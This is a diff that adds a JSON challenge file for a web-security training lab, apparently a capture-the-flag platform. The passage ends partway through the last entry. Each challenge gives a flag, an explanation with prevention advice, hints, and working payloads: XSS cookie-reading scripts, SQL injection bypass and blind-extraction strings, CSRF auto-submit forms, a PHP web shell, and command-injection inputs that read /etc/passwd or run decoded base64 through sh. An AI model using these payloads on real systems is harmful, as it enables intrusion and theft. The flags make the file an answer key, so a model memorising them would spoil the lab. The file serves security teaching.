@@ -1,0 +1,575 @@
+{
+  "xss-basic": {
+    "title": "XSS – Basic: Reflected XSS Injection",
+    "category": "XSS",
+    "difficulty": "easy",
+    "flag": "FLAG{xss_basic_reflected_alert_123}",
+    "explanation": {
+      "overview": "Reflected XSS (Cross-Site Scripting) occurs when user input is immediately reflected in the response without proper sanitization. In this challenge, the application takes a 'name' parameter from the URL and directly displays it on the page.",
+      "vulnerability": "The application doesn't sanitize or encode user input before displaying it. When you enter JavaScript code in the name field, it gets executed in the browser.",
+      "howToExploit": "Enter `<script>alert('XSS')</script>` in the name input field. This script will be reflected in the page and executed. The flag is hidden in a comment in the page source (check with Ctrl+U or View Source).",
+      "realWorldImpact": "Attackers can steal cookies, session tokens, or redirect users to malicious sites. This is one of the most common web vulnerabilities.",
+      "prevention": "Always encode/sanitize user input before displaying it. Use Content Security Policy (CSP) headers. Validate and escape all user-controlled data.",
+      "containerInfo": "This lab runs in an isolated Express.js container to prevent cross-contamination. Each user's session is independent."
+    },
+    "hints": [
+      "Check the URL parameters",
+      "View the page source after submitting",
+      "Try injecting JavaScript in the name field"
+    ],
+    "payloads": [
+      "<script>alert('XSS')</script>",
+      "<img src=x onerror=alert('XSS')>",
+      "<svg onload=alert('XSS')>"
+    ]
+  },
+  "xss-medium": {
+    "title": "XSS – Medium: Stored XSS Exploitation",
+    "category": "XSS",
+    "difficulty": "medium",
+    "flag": "FLAG{xss_medium_stored_exec_456}",
+    "explanation": {
+      "overview": "Stored XSS (also called Persistent XSS) occurs when malicious scripts are stored in a database or server-side storage and executed every time the stored data is displayed.",
+      "vulnerability": "The comment/message system stores user input without sanitization. When other users view the page, the malicious script executes in their browsers.",
+      "howToExploit": "Submit a comment with a JavaScript payload like `<script>alert(document.cookie)</script>`. The comment is stored and displayed to all users who view the page. Check the stored comments section for the flag.",
+      "realWorldImpact": "More dangerous than reflected XSS because it affects all users viewing the page. Can be used for mass cookie theft, defacement, or keylogging.",
+      "prevention": "Sanitize all user input before storing in database. Use output encoding when displaying stored content. Implement CSP headers. Validate content type and length.",
+      "containerInfo": "Each lab instance has its own isolated database. Users cannot see each other's submissions, ensuring fair practice."
+    },
+    "hints": [
+      "Submit a malicious comment",
+      "Check what happens when the page reloads",
+      "Try to read cookies with your payload"
+    ],
+    "payloads": [
+      "<script>alert(document.cookie)</script>",
+      "<img src=x onerror='alert(document.cookie)'>",
+      "<svg onload='alert(document.cookie)'>"
+    ]
+  },
+  "xss-hard": {
+    "title": "XSS – Hard: Filter Bypass XSS",
+    "category": "XSS",
+    "difficulty": "hard",
+    "flag": "FLAG{xss_hard_filter_bypass_789}",
+    "explanation": {
+      "overview": "Some applications implement weak XSS filters that try to block common patterns. This challenge has a filter that removes 'script', 'onerror', and 'onload' keywords, but it can be bypassed.",
+      "vulnerability": "The filter uses simple string replacement, which can be bypassed using various encoding techniques, case variations, or alternative HTML tags and event handlers.",
+      "howToExploit": "The filter removes 'script', 'onerror', and 'onload' (case-insensitive). Try using: `<ScRiPt>alert(1)</ScRiPt>` or `<img src=x oNeRrOr=alert(1)>` or use event handlers that aren't filtered like `onmouseover`, `onfocus`, or HTML5 event handlers.",
+      "realWorldImpact": "Weak filters give a false sense of security. Attackers use encoding, obfuscation, and creative payloads to bypass filters. Understanding filter limitations is crucial for defense.",
+      "prevention": "Never rely on simple string replacement. Use proper HTML encoding libraries. Implement a whitelist approach. Use CSP with 'unsafe-inline' disabled. Regular security audits.",
+      "containerInfo": "Advanced filter bypass techniques are safely contained in this isolated environment. Real attacks would require WAF evasion skills."
+    },
+    "hints": [
+      "Try case variations (ScRiPt)",
+      "Use alternative event handlers",
+      "Think about how the filter processes your input"
+    ],
+    "payloads": [
+      "<ScRiPt>alert(1)</ScRiPt>",
+      "<img src=x oNeRrOr=alert(1)>",
+      "<body onfocus=alert(1) autofocus>"
+    ]
+  },
+  "sqli-basic": {
+    "title": "SQL Injection – Basic: Login Bypass",
+    "category": "SQL Injection",
+    "difficulty": "easy",
+    "flag": "FLAG{sqli_basic_login_bypass_abc}",
+    "explanation": {
+      "overview": "SQL Injection allows attackers to manipulate database queries by injecting malicious SQL code. In this challenge, the login form constructs a SQL query directly from user input.",
+      "vulnerability": "The application builds a SQL query like: `SELECT * FROM users WHERE username='$username' AND password='$password'`. If you input `admin'--` as username, the query becomes `SELECT * FROM users WHERE username='admin'--' AND password=''` which comments out the password check.",
+      "howToExploit": "Enter `admin'--` or `admin' OR '1'='1'--` as the username and any password (or leave it empty). The `--` comments out the rest of the query, bypassing the password check. After successful login, the flag is displayed.",
+      "realWorldImpact": "Can bypass authentication, access unauthorized data, modify or delete database records. One of the most critical vulnerabilities according to OWASP Top 10.",
+      "prevention": "Always use parameterized queries (prepared statements). Never concatenate user input into SQL queries. Use ORM frameworks. Implement least privilege database access. Input validation and sanitization.",
+      "containerInfo": "Each challenge uses a simulated database that mimics real SQL injection scenarios. No real database is exposed to external connections."
+    },
+    "hints": [
+      "Try to break out of the SQL query",
+      "Use SQL comment syntax (--)",
+      "Think about what happens to the password check"
+    ],
+    "payloads": [
+      "admin'--",
+      "admin' OR '1'='1'--",
+      "' OR '1'='1'--"
+    ]
+  },
+  "sqli-medium": {
+    "title": "SQL Injection – Medium: Database Enumeration",
+    "category": "SQL Injection",
+    "difficulty": "medium",
+    "flag": "FLAG{sqli_medium_enum_db_xyz}",
+    "explanation": {
+      "overview": "UNION-based SQL injection allows extracting data from multiple tables in a single query. This challenge requires you to enumerate the database structure and retrieve sensitive information.",
+      "vulnerability": "The application uses a vulnerable query that accepts a user ID parameter and can be manipulated with UNION SELECT statements to retrieve data from other tables.",
+      "howToExploit": "Start with `1 UNION SELECT null,null` to determine column count. Then use `1 UNION SELECT username,password FROM users` or similar to extract data. The flag is stored in a secrets table: `1 UNION SELECT name,value FROM secrets`.",
+      "realWorldImpact": "Allows complete database enumeration, extraction of sensitive data like passwords, credit cards, personal information. Can lead to complete database compromise.",
+      "prevention": "Use parameterized queries. Limit database user permissions. Implement rate limiting. Use Web Application Firewalls (WAF). Regular security testing. Encrypt sensitive data.",
+      "containerInfo": "Isolated test database with sample data. Real enumeration techniques work but cannot affect production systems."
+    },
+    "hints": [
+      "Determine the number of columns first",
+      "Use UNION SELECT statements",
+      "Look for tables named 'secrets' or 'flags'"
+    ],
+    "payloads": [
+      "1 UNION SELECT null,null",
+      "1 UNION SELECT name,value FROM secrets",
+      "-1 UNION SELECT 1,flag FROM secrets WHERE id=1"
+    ]
+  },
+  "sqli-hard": {
+    "title": "SQL Injection – Hard: Blind SQL Injection",
+    "category": "SQL Injection",
+    "difficulty": "hard",
+    "flag": "FLAG{sqli_hard_blind_injection_123}",
+    "explanation": {
+      "overview": "Blind SQL Injection occurs when the application doesn't display SQL errors or query results, but you can infer information based on application behavior differences.",
+      "vulnerability": "The application doesn't show query results directly, but uses time-based or boolean-based responses. You can extract data character by character using conditional queries.",
+      "howToExploit": "Use time-based injection with `SLEEP()` or conditional delays. For example: `1 AND IF(SUBSTRING((SELECT flag FROM secrets LIMIT 1),1,1)='F',SLEEP(5),0)`. If the page takes 5 seconds to load, the first character is 'F'. Repeat for each character to extract the full flag.",
+      "realWorldImpact": "More difficult to detect but equally dangerous. Can extract entire databases character by character. Often undetected by automated scanners.",
+      "prevention": "Same as regular SQL injection. Additionally: Monitor query execution times. Implement request throttling. Use database-level protections. Regular penetration testing.",
+      "containerInfo": "Time-based delays are simulated. Real blind SQL injection can take hours or days to extract complete data."
+    },
+    "hints": [
+      "Use time-based functions like SLEEP()",
+      "Extract data character by character",
+      "Use conditional statements (IF, CASE)"
+    ],
+    "payloads": [
+      "1 AND SLEEP(5)--",
+      "1 AND IF(1=1,SLEEP(5),0)--",
+      "1 AND IF(ASCII(SUBSTRING((SELECT flag FROM secrets),1,1))=70,SLEEP(5),0)--"
+    ]
+  },
+  "csrf-basic": {
+    "title": "CSRF – Basic: Password Change CSRF",
+    "category": "CSRF",
+    "difficulty": "easy",
+    "flag": "FLAG{csrf_basic_password_change_def}",
+    "explanation": {
+      "overview": "Cross-Site Request Forgery (CSRF) allows attackers to perform unauthorized actions on behalf of authenticated users by tricking them into submitting requests.",
+      "vulnerability": "The password change form doesn't implement CSRF protection. If a logged-in user visits a malicious page, it can automatically submit the password change form on their behalf.",
+      "howToExploit": "Create an HTML page with a form that submits to the password change endpoint. When a logged-in user visits your page, the form auto-submits, changing their password. Use: `<form action='http://target/password-change' method='POST'><input name='newPassword' value='attacker123'><input type='submit'></form><script>document.forms[0].submit()</script>`",
+      "realWorldImpact": "Can change passwords, transfer funds, modify account settings, delete data - any state-changing operation. Very dangerous when combined with social engineering.",
+      "prevention": "Implement CSRF tokens. Use SameSite cookie attribute. Verify Origin/Referer headers. Require re-authentication for sensitive operations. Use double-submit cookies.",
+      "containerInfo": "CSRF attacks are simulated. Real CSRF requires careful social engineering and timing."
+    },
+    "hints": [
+      "Create an external HTML page with a form",
+      "Auto-submit the form using JavaScript",
+      "The flag appears after successful password change"
+    ],
+    "payloads": [
+      "<form method='POST' action='/lab/csrf-basic/change'><input name='newPassword' value='hacked'><input type='submit'></form><script>document.forms[0].submit()</script>"
+    ]
+  },
+  "csrf-medium": {
+    "title": "CSRF – Medium: Account Takeover CSRF",
+    "category": "CSRF",
+    "difficulty": "medium",
+    "flag": "FLAG{csrf_medium_account_takeover_ghi}",
+    "explanation": {
+      "overview": "This challenge combines CSRF with account takeover. By changing the victim's email to the attacker's email, the attacker can reset the password and gain control.",
+      "vulnerability": "The email update endpoint lacks CSRF protection. An attacker can change a victim's email to their own, then use password reset to gain account access.",
+      "howToExploit": "Create a CSRF payload that changes the victim's email to 'attacker@example.com'. After the victim visits your page, their email is changed. Then use password reset to the attacker's email to gain access. The flag is revealed after email change.",
+      "realWorldImpact": "Complete account takeover. Critical for financial applications, social media, email services. Can lead to identity theft and financial loss.",
+      "prevention": "CSRF tokens on all state-changing endpoints. Email change should require confirmation. Implement rate limiting. Monitor for suspicious email changes. Multi-factor authentication.",
+      "containerInfo": "Account takeover scenarios are safely contained. Real attacks require additional steps like email verification bypass."
+    },
+    "hints": [
+      "Change the email to attacker's email",
+      "Then use password reset",
+      "The flag appears when email is changed to attacker@example.com"
+    ],
+    "payloads": [
+      "<form method='POST' action='/lab/csrf-medium/update'><input name='email' value='attacker@example.com'><input type='submit'></form><script>document.forms[0].submit()</script>"
+    ]
+  },
+  "csrf-hard": {
+    "title": "CSRF – Hard: Token Bypass CSRF",
+    "category": "CSRF",
+    "difficulty": "hard",
+    "flag": "FLAG{csrf_hard_token_bypass_jkl}",
+    "explanation": {
+      "overview": "Some applications implement weak CSRF token validation. This challenge has a CSRF token, but the validation has flaws that can be bypassed.",
+      "vulnerability": "The CSRF token validation checks if the token contains certain patterns rather than exact matches. You can bypass it by manipulating the token or using token prediction.",
+      "howToExploit": "The token validation checks if the token includes 'random_token' string. You can use a token like 'random_token_bypass' or extract the token from the page and reuse it. The flag appears after successful transfer with bypassed token.",
+      "realWorldImpact": "Weak token validation defeats CSRF protection. Can lead to financial fraud, unauthorized transactions, data manipulation. Shows importance of proper implementation.",
+      "prevention": "Use cryptographically secure random tokens. Validate tokens exactly, not partially. Store tokens server-side. Use short token expiration. Implement token rotation.",
+      "containerInfo": "Token bypass techniques are demonstrated safely. Real attacks require understanding application logic flaws."
+    },
+    "hints": [
+      "Check how the token is validated",
+      "Try manipulating the token",
+      "Look for validation logic flaws"
+    ],
+    "payloads": [
+      "Extract token from page and reuse",
+      "Use partial token match exploit",
+      "Bypass validation with token manipulation"
+    ]
+  },
+  "idor-basic": {
+    "title": "IDOR – Basic: Unauthorized Profile Access",
+    "category": "IDOR",
+    "difficulty": "easy",
+    "flag": "FLAG{idor_basic_unauthorized_access_mno}",
+    "explanation": {
+      "overview": "Insecure Direct Object Reference (IDOR) occurs when an application exposes internal object references (like user IDs) without proper authorization checks.",
+      "vulnerability": "The application allows you to access any user's profile by changing the userId parameter. There's no check to verify if you're authorized to view that user's data.",
+      "howToExploit": "You're logged in as user 2. Change the URL parameter from `?userId=2` to `?userId=1` to access the admin profile. The flag is displayed in user 1's profile data.",
+      "realWorldImpact": "Can expose sensitive user data, personal information, financial records. Common in APIs and web applications. Easy to exploit, difficult to detect.",
+      "prevention": "Implement proper authorization checks. Use indirect object references (mapping). Implement access control lists. Never expose internal IDs. Use UUIDs instead of sequential IDs.",
+      "containerInfo": "IDOR vulnerabilities are isolated per user session. Real attacks can access millions of user records."
+    },
+    "hints": [
+      "Try changing the userId parameter",
+      "Access user ID 1 (admin account)",
+      "Check what data is exposed"
+    ],
+    "payloads": [
+      "?userId=1",
+      "?userId=0",
+      "?userId=-1"
+    ]
+  },
+  "idor-medium": {
+    "title": "IDOR – Medium: Invoice Data Exposure",
+    "category": "IDOR",
+    "difficulty": "medium",
+    "flag": "FLAG{idor_medium_invoice_data_pqr}",
+    "explanation": {
+      "overview": "This challenge demonstrates IDOR in a business context where invoice IDs can be enumerated to access other users' financial information.",
+      "vulnerability": "Invoice IDs are sequential and predictable. You can increment the invoice ID to access invoices belonging to other users. No authorization check prevents this.",
+      "howToExploit": "You have access to invoice 1002. Try accessing invoice 1001, 1003, 1004, etc. The flag is stored in invoice 1001 which belongs to user 1. Change the invoiceId parameter to access it.",
+      "realWorldImpact": "Can expose financial information, purchase history, billing addresses, payment methods. Critical for e-commerce and financial applications. GDPR violation.",
+      "prevention": "Use non-sequential, unpredictable IDs (UUIDs). Implement proper authorization on every request. Use indirect references. Encrypt sensitive invoice data. Audit access logs.",
+      "containerInfo": "Invoice enumeration is demonstrated safely. Real attacks can access thousands of invoices with simple scripts."
+    },
+    "hints": [
+      "Try different invoice IDs",
+      "Invoice IDs are sequential",
+      "Look for invoice 1001"
+    ],
+    "payloads": [
+      "?invoiceId=1001",
+      "?invoiceId=1003",
+      "?invoiceId=1004"
+    ]
+  },
+  "idor-hard": {
+    "title": "IDOR – Hard: Privilege Escalation via IDOR",
+    "category": "IDOR",
+    "difficulty": "hard",
+    "flag": "FLAG{idor_hard_privilege_escalation_stu}",
+    "explanation": {
+      "overview": "Advanced IDOR allows modifying user roles and permissions by directly manipulating object references. This leads to privilege escalation.",
+      "vulnerability": "The edit role functionality doesn't verify if you're modifying your own account or if you have permission to change roles. You can change another user's role, including your own, to gain admin access.",
+      "howToExploit": "Use the edit action with userId=1 (admin account). Change the role parameter to grant yourself admin privileges, or directly modify user 1's profile to escalate your privileges. The flag appears when admin role is granted.",
+      "realWorldImpact": "Most critical form of IDOR. Can gain administrative access, bypass all security controls, modify system settings, access all user data. Complete system compromise.",
+      "prevention": "Strict authorization on all state-changing operations. Separate admin and user functions. Implement role-based access control (RBAC). Audit all privilege changes. Use separate endpoints for admin operations.",
+      "containerInfo": "Privilege escalation is contained within the lab. Real attacks can compromise entire systems."
+    },
+    "hints": [
+      "Try editing other users' profiles",
+      "Modify the role field",
+      "Change userId=1 to grant admin access"
+    ],
+    "payloads": [
+      "?userId=1&action=edit",
+      "POST with role=admin",
+      "Modify admin user's permissions"
+    ]
+  },
+  "file-upload-basic": {
+    "title": "File Upload – Basic: Malicious File Upload",
+    "category": "File Upload",
+    "difficulty": "easy",
+    "flag": "FLAG{file_upload_basic_malicious_vwx}",
+    "explanation": {
+      "overview": "Unrestricted file upload allows attackers to upload and execute malicious files like PHP shells, scripts, or executables on the server.",
+      "vulnerability": "The application accepts file uploads without any validation. You can upload PHP files, which will be executed by the web server when accessed.",
+      "howToExploit": "Create a PHP web shell: `<?php system($_GET['cmd']); ?>`. Save it as `shell.php` and upload it. Then access the uploaded file at `/uploads/shell.php?cmd=ls` or similar. The flag is in the uploads directory or can be read with the shell.",
+      "realWorldImpact": "Complete server compromise. Can execute arbitrary commands, access databases, read files, install backdoors, use server for attacks. Critical vulnerability.",
+      "prevention": "Validate file types (whitelist). Check file extensions. Scan for malicious content. Store uploads outside web root. Use unique filenames. Implement file size limits. Disable execution in upload directories.",
+      "containerInfo": "File uploads are isolated in separate directories. Real attacks can compromise entire servers."
+    },
+    "hints": [
+      "Upload a PHP file",
+      "Access the uploaded file via URL",
+      "Use system commands to find the flag"
+    ],
+    "payloads": [
+      "<?php system($_GET['cmd']); ?>",
+      "<?php phpinfo(); ?>",
+      "<?php echo shell_exec('cat flag.txt'); ?>"
+    ]
+  },
+  "file-upload-medium": {
+    "title": "File Upload – Medium: MIME Type Bypass",
+    "category": "File Upload",
+    "difficulty": "medium",
+    "flag": "FLAG{file_upload_medium_mime_bypass_yza}",
+    "explanation": {
+      "overview": "Some applications validate file uploads by checking MIME types, which can be easily spoofed. The server checks Content-Type header rather than actual file content.",
+      "vulnerability": "The validation only checks the MIME type header (`image/jpeg`, `image/png`), which can be manipulated. You can upload a PHP file but set the Content-Type to `image/jpeg`.",
+      "howToExploit": "Use Burp Suite or browser extensions to intercept the upload request. Change the Content-Type header from `application/x-php` to `image/jpeg` while keeping the PHP file content. Or rename `shell.php` to `shell.php.jpg` and manipulate MIME type. The flag appears after successful upload.",
+      "realWorldImpact": "Bypasses weak upload filters. Can upload and execute malicious code. Same impact as unrestricted upload. Shows importance of content validation.",
+      "prevention": "Validate actual file content, not just headers. Use magic bytes (file signatures). Implement server-side file type detection. Content scanning. Never trust client-provided MIME types.",
+      "containerInfo": "MIME spoofing is demonstrated. Real attacks require HTTP manipulation tools."
+    },
+    "hints": [
+      "Intercept the upload request",
+      "Modify the Content-Type header",
+      "Keep PHP content but change MIME type"
+    ],
+    "payloads": [
+      "Change Content-Type: application/x-php to image/jpeg",
+      "Upload .php.jpg file with manipulated MIME",
+      "Use Burp Suite to modify headers"
+    ]
+  },
+  "file-upload-hard": {
+    "title": "File Upload – Hard: Web Shell Execution",
+    "category": "File Upload",
+    "difficulty": "hard",
+    "flag": "FLAG{file_upload_hard_webshell_exec_bcd}",
+    "explanation": {
+      "overview": "Advanced file upload bypasses use double extensions, null bytes, or other techniques to bypass extension blacklists while still executing as scripts.",
+      "vulnerability": "The application blacklists common extensions (.php, .jsp, .asp) but can be bypassed using double extensions, null byte injection, or case variations.",
+      "howToExploit": "Use double extension: `shell.php.jpg` or `shell.php.png`. Some servers process the last extension, others the first. Also try null byte: `shell.php%00.jpg` or `shell.php%00.png`. Case variations: `shell.PhP` or `shell.PHP`. The flag is accessible after shell execution.",
+      "realWorldImpact": "Bypasses security filters. Enables complete server compromise. More difficult to detect. Requires advanced bypass techniques.",
+      "prevention": "Use whitelist (not blacklist) for extensions. Strip multiple extensions. Remove null bytes. Normalize case. Content-based validation. Rename uploads with safe extensions. Disable execution in upload directories.",
+      "containerInfo": "Advanced bypass techniques are safely demonstrated. Real attacks require deep understanding of server configuration."
+    },
+    "hints": [
+      "Try double extensions (.php.jpg)",
+      "Use null byte injection (%00)",
+      "Case variations might work"
+    ],
+    "payloads": [
+      "shell.php.jpg",
+      "shell.php%00.jpg",
+      "shell.PhP"
+    ]
+  },
+  "command-injection-basic": {
+    "title": "Command Injection – Basic: OS Command Injection",
+    "category": "Command Injection",
+    "difficulty": "easy",
+    "flag": "FLAG{command_injection_basic_os_cmd_efg}",
+    "explanation": {
+      "overview": "Command injection occurs when an application passes user input to system shell commands without proper sanitization. This allows executing arbitrary OS commands.",
+      "vulnerability": "The ping functionality takes a hostname/IP and passes it directly to the system `ping` command. By injecting command separators, you can execute additional commands.",
+      "howToExploit": "Instead of a valid IP, enter: `8.8.8.8; cat /etc/passwd` or `8.8.8.8 && ls` or `8.8.8.8 | whoami`. The semicolon (;) executes multiple commands. The && operator runs the second command if the first succeeds. The pipe (|) passes output. The flag is displayed when command injection succeeds.",
+      "realWorldImpact": "Complete server compromise. Can read files, modify data, install backdoors, use server as pivot point for attacks. Critical vulnerability with system-level access.",
+      "prevention": "Never pass user input to system commands. Use parameterized APIs. Whitelist allowed inputs. Escape shell metacharacters. Run with least privilege. Use input validation libraries. Disable dangerous functions.",
+      "containerInfo": "Command execution is simulated in isolated environment. Real attacks can compromise entire servers and networks."
+    },
+    "hints": [
+      "Try command separators (; && |)",
+      "Injection after the IP address",
+      "Execute system commands like ls, cat, whoami"
+    ],
+    "payloads": [
+      "8.8.8.8; cat flag.txt",
+      "8.8.8.8 && ls -la",
+      "8.8.8.8 | whoami"
+    ]
+  },
+  "command-injection-medium": {
+    "title": "Command Injection – Medium: Chained Command Execution",
+    "category": "Command Injection",
+    "difficulty": "medium",
+    "flag": "FLAG{command_injection_medium_chained_hij}",
+    "explanation": {
+      "overview": "Advanced command injection involves chaining multiple commands together to achieve complex objectives like file reading, data exfiltration, or privilege escalation.",
+      "vulnerability": "The file reading functionality accepts a filename but doesn't validate it. You can chain commands to read multiple files, search for flags, or execute complex operations.",
+      "howToExploit": "Use command chaining: `flag.txt; cat /etc/passwd` or `flag.txt && ls -la /` or `flag.txt | grep FLAG`. You can also use backticks for command substitution: `` `whoami`.txt`` or use $(command) syntax. The flag is in a file that needs to be discovered.",
+      "realWorldImpact": "Can achieve complex attack chains. Read sensitive files, exfiltrate data, pivot to other systems, maintain persistence. More sophisticated than basic injection.",
+      "prevention": "Same as basic command injection. Additionally: Implement strict input validation. Use safe APIs. Monitor command execution. Log all file operations. Implement file access controls.",
+      "containerInfo": "Command chaining is demonstrated safely. Real attacks can traverse entire file systems."
+    },
+    "hints": [
+      "Chain multiple commands",
+      "Read files in different directories",
+      "Use grep to search for flags"
+    ],
+    "payloads": [
+      "flag.txt; cat /etc/passwd",
+      "flag.txt && find / -name '*flag*'",
+      "flag.txt | grep FLAG"
+    ]
+  },
+  "command-injection-hard": {
+    "title": "Command Injection – Hard: Remote Code Execution",
+    "category": "Command Injection",
+    "difficulty": "hard",
+    "flag": "FLAG{command_injection_hard_rce_klm}",
+    "explanation": {
+      "overview": "Despite input filtering that removes some characters, you can still achieve RCE using environment variables, base64 encoding, or alternative command injection techniques.",
+      "vulnerability": "The application filters semicolons, ampersands, pipes, and backticks, but doesn't filter all possible injection vectors. You can use environment variables, command substitution with $(), or base64 decoding.",
+      "howToExploit": "Use environment variables: `$HOME` or `${HOME}`. Use command substitution: `$(whoami)` or `$(cat flag.txt)`. Base64 encode your command: `echo 'd2hvYW1p' | base64 -d | sh`. Use ${IFS} for spaces. The flag appears when RCE is achieved.",
+      "realWorldImpact": "Bypasses basic filters. Shows that simple filtering is insufficient. Can still achieve complete system compromise. Requires advanced techniques.",
+      "prevention": "Comprehensive input validation. Whitelist approach. Never use user input in commands. Use secure APIs. Regular security audits. WAF with command injection rules.",
+      "containerInfo": "Advanced RCE techniques are demonstrated. Real attacks bypass multiple layers of security."
+    },
+    "hints": [
+      "Use environment variables ($HOME, $USER)",
+      "Try base64 encoding commands",
+      "Use ${IFS} for spaces instead of actual spaces"
+    ],
+    "payloads": [
+      "$(cat flag.txt)",
+      "echo 'Y2F0IGZsYWcudHh0' | base64 -d",
+      "${HOME}$(cat${IFS}flag.txt)"
+    ]
+  },
+  "auth-bypass-basic": {
+    "title": "Authentication Bypass – Basic: Weak Login Validation",
+    "category": "Authentication Bypass",
+    "difficulty": "easy",
+    "flag": "FLAG{auth_bypass_basic_weak_validation_nop}",
+    "explanation": {
+      "overview": "Weak authentication validation uses loose comparisons (== instead of ===) or type coercion, allowing authentication bypass through creative input manipulation.",
+      "vulnerability": "The login uses JavaScript's loose equality (==) which performs type coercion. You can bypass authentication by exploiting how strings and numbers are compared, or using magic values.",
+      "howToExploit": "In JavaScript, `'1' == 1` is true due to type coercion. Try username: `admin` with password that coerces to match. Or use SQL injection if backend uses similar logic: `admin'--` or array manipulation if it checks `password == user.password` - try password as array. The flag appears after successful admin login.",
+      "realWorldImpact": "Can bypass authentication entirely. Gain unauthorized access. Access admin functions. Critical vulnerability affecting access control.",
+      "prevention": "Use strict comparison (===). Implement proper password hashing (bcrypt, argon2). Use parameterized queries. Rate limiting. Account lockout. Multi-factor authentication. Regular security audits.",
+      "containerInfo": "Authentication bypass is safely demonstrated. Real attacks can access all user accounts."
+    },
+    "hints": [
+      "Think about type coercion",
+      "Try different data types for password",
+      "Use loose comparison exploits"
+    ],
+    "payloads": [
+      "Try password as number if username is number",
+      "Use type coercion (1 == '1')",
+      "Array manipulation if possible"
+    ]
+  },
+  "auth-bypass-medium": {
+    "title": "Authentication Bypass – Medium: Token Manipulation",
+    "category": "Authentication Bypass",
+    "difficulty": "medium",
+    "flag": "FLAG{auth_bypass_medium_token_manipulation_qrs}",
+    "explanation": {
+      "overview": "JWT (JSON Web Token) manipulation involves modifying token payload, using 'none' algorithm, or weak secret exploitation to gain unauthorized access or elevate privileges.",
+      "vulnerability": "The application uses JWT for authentication. If the secret is weak or validation is flawed, you can modify the token to change your role to 'admin' or forge tokens.",
+      "howToExploit": "Decode the JWT token (use jwt.io). Modify the payload to change role to 'admin'. If using 'none' algorithm, change algorithm to 'none' and remove signature. Or if secret is weak, try common secrets. Submit the modified token. Flag appears when admin role is granted.",
+      "realWorldImpact": "Privilege escalation. Unauthorized admin access. Can modify any user's data. Access all system functions. Critical for applications relying on JWT.",
+      "prevention": "Use strong, unique secrets. Validate algorithm. Never accept 'none' algorithm. Use RS256 instead of HS256. Implement token expiration. Validate all token claims. Rotate secrets regularly.",
+      "containerInfo": "JWT manipulation is safely demonstrated. Real attacks require token analysis and cryptographic knowledge."
+    },
+    "hints": [
+      "Decode the JWT token",
+      "Modify the role in payload",
+      "Try 'none' algorithm if allowed"
+    ],
+    "payloads": [
+      "Change role: admin in JWT payload",
+      "Set algorithm: none",
+      "Brute force weak secret"
+    ]
+  },
+  "auth-bypass-hard": {
+    "title": "Authentication Bypass – Hard: Session Fixation Attack",
+    "category": "Authentication Bypass",
+    "difficulty": "hard",
+    "flag": "FLAG{auth_bypass_hard_session_fixation_tuv}",
+    "explanation": {
+      "overview": "Session fixation occurs when an attacker forces a user to use a predetermined session ID, allowing the attacker to hijack the session after the user authenticates.",
+      "vulnerability": "The application doesn't regenerate session IDs after login. If you can set a session ID before login, the victim will use your session ID, and you can then access their authenticated session.",
+      "howToExploit": "1) Get a session ID from the application. 2) Send a link with that session ID to the victim (or set it in their browser). 3) When they log in, they authenticate with your session ID. 4) You can now access their authenticated session using your original session ID. The flag appears when you access an admin session.",
+      "realWorldImpact": "Complete session hijacking. Access user's account without knowing credentials. Can perform actions as the victim. Often combined with social engineering.",
+      "prevention": "Always regenerate session ID after login. Invalidate old sessions. Use secure, random session IDs. Implement session timeout. Use SameSite cookies. Monitor for suspicious session activity.",
+      "containerInfo": "Session fixation is demonstrated. Real attacks require social engineering to make victims use your session ID."
+    },
+    "hints": [
+      "Get a session ID before login",
+      "Force user to use your session ID",
+      "Access session after they authenticate"
+    ],
+    "payloads": [
+      "Set sessionId cookie, then login",
+      "Fixate session ID in URL parameter",
+      "Use session ID from before authentication"
+    ]
+  },
+  "forensics-basic": {
+    "title": "Basic Forensics – Basic: Hidden Flag Discovery",
+    "category": "Forensics",
+    "difficulty": "easy",
+    "flag": "FLAG{forensics_basic_hidden_flag_wxy}",
+    "explanation": {
+      "overview": "Forensics challenges require finding hidden information in web pages, including source code, comments, cookies, headers, or metadata that contains flags or sensitive data.",
+      "vulnerability": "Developers sometimes leave sensitive information in HTML comments, JavaScript code, hidden form fields, cookies, or HTTP headers. This information should never be exposed to clients.",
+      "howToExploit": "View page source (Ctrl+U). Check HTML comments for flags. Inspect browser console for JavaScript variables. Check cookies in DevTools. Examine network requests in Network tab for flags in headers or responses. Look for hidden divs with display:none. The flag is in a comment: `<!-- FLAG{forensics_basic_hidden_flag_wxy} -->`",
+      "realWorldImpact": "Information disclosure. Can reveal API keys, passwords, internal structure, business logic, database schemas. Often leads to other vulnerabilities.",
+      "prevention": "Never include sensitive data in client-side code. Remove all comments in production. Use environment variables. Secure API keys server-side. Implement proper error handling. Code review for information leaks.",
+      "containerInfo": "Forensics techniques are demonstrated. Real forensics requires analyzing complex applications and networks."
+    },
+    "hints": [
+      "View page source",
+      "Check HTML comments",
+      "Look in browser console and network tab"
+    ],
+    "payloads": [
+      "View source (Ctrl+U)",
+      "Inspect element",
+      "Check DevTools Console and Network tabs"
+    ]
+  },
+  "forensics-medium": {
+    "title": "Basic Forensics – Medium: Log File Analysis",
+    "category": "Forensics",
+    "difficulty": "medium",
+    "flag": "FLAG{forensics_medium_log_analysis_zab}",
+    "explanation": {
+      "overview": "Server logs contain valuable information about application activity. Analyzing logs can reveal flags, suspicious activities, attack patterns, or sensitive data exports.",
+      "vulnerability": "Log files are sometimes exposed or accessible, containing sensitive information like flags exported during operations, failed login attempts, or unusual activities.",
+      "howToExploit": "Examine the log entries carefully. Look for unusual IP addresses, failed login attempts, file access operations, or data export actions. The flag is in a log entry with action 'EXPORT' and data field contains the flag. Filter or search logs for 'EXPORT' or 'flag' to find it.",
+      "realWorldImpact": "Information disclosure through logs. Can reveal attack attempts, user activities, system errors, API keys in URLs, sensitive data. Log analysis is crucial for incident response.",
+      "prevention": "Secure log files. Don't expose logs publicly. Sanitize logs (remove sensitive data). Implement log rotation. Monitor log access. Encrypt sensitive log data. Use centralized logging systems.",
+      "containerInfo": "Log analysis is demonstrated with sample logs. Real forensics involves analyzing gigabytes of log data."
+    },
+    "hints": [
+      "Look for unusual activities",
+      "Search for 'EXPORT' action",
+      "Check data fields in log entries"
+    ],
+    "payloads": [
+      "Filter logs by action type",
+      "Search for 'flag' in logs",
+      "Look for data export operations"
+    ]
+  },
+  "forensics-hard": {
+    "title": "Basic Forensics – Hard: Memory Dump Investigation",
+    "category": "Forensics",
+    "difficulty": "hard",
+    "flag": "FLAG{forensics_hard_memory_dump_cde}",
+    "explanation": {
+      "overview": "Memory dumps contain runtime data including flags, passwords, encryption keys, and other sensitive information that may be encoded or obfuscated. Forensics involves extracting this data.",
